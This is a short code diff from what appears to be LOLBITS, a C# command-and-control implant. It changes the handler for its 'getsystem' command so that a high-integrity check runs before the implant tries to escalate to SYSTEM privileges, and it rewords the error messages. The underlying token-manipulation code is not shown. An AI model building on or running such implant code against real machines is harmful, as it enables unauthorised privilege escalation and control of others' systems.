@@ -258,10 +258,10 @@ namespace LOLBITS
                 case "getsystem":
                     {
 
-                        if (TokenManager.getSystem()) 
-                            rps = "We are System!\n";
+                        if (TokenUtils.IsHighIntegrity())
+                            rps = TokenManager.getSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
                         else
-                            rps = "ERR: An error ocurred! Have this user granted the required privileges?\n";
+                            rps = "ERR:Process failed! Is this process running with high integrity level?\n";
 
                         break;
                     }
